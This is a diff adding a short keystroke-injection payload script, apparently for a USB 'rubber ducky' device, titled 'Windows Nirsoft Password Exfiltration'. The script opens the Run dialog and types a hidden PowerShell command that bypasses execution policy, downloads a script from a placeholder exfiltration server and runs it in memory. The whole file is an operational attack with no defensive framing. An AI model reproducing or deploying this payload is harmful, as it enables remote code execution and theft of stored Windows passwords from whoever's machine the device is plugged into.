@@ -1,0 +1,5 @@
+REM Windows Nirsoft Password Exfiltration
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -ep bypass -c "IWR https://your-exfil-server.com/s.ps1 | iex"
+ENTER
